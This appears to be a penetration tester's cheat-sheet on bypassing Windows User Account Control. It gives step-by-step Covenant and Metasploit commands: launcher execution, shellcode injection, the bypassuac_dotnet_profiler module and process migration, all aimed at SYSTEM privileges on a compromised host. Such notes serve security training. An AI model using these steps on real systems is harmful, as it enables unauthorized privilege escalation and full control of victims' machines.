# UAC Bypass

- We assume that we already have a shell on the target

## With Covenant

- Get the helper.ps1 script with Powershell Import
- Copy an encoded launcher from the Launchers session of Covenant
- Type this command and append it with your launcher and close the quote `PowerShell helper -custom "cmd.exe /c <Launcher-HERE>"`
- You will get a shell as the same user but your shell will be in an administrative user context
- If you type `ps` you should be able to see also admin process
- To have an admin shell we can download a grunt as a shellcode
- To do so, We go to grunt we select shellcode we click on generate and we download the bin
- Then back on the shell, we Type `inject` in the most recent shell and select the binary then use a process number with admin privileges click on execute
- We should have a shell as system

## With Metasploit

- Interact with the current session using `session -i id-of-session`
- type `run post/multi/recon/local_exploit_suggester `
- We should see in the list this if the target is vulnerable
  ```
  [+] 192.168.3.4 - exploit/windows/local/always_install_elevated: The target is vulnerable.
  [+] 192.168.3.4 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
  ```
-  Ctrl Z the session
- `use exploit/windows/local/bypassuac_dotnet_profiler`
- set the session to the id of the one we have on the target
- and then exploit -j  
- We should have a new session
- We are not admin yet but we have and administrative user context
- List processes using `ps` and find one with admin rights remember the process id
- type `migrat process-id`
- if you type `getuid` you should have authority system

## Resources

- To understand more about Fodhelper
{% embed url="https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/" %} Bypassing Defender The Easy Way – FodHelper by Joe Helle {% endembed %}
{% embed url="https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers" %} TCM security Academy -  Movement pivoting and persistence for pentesters and ethical hacker {% endembed %}
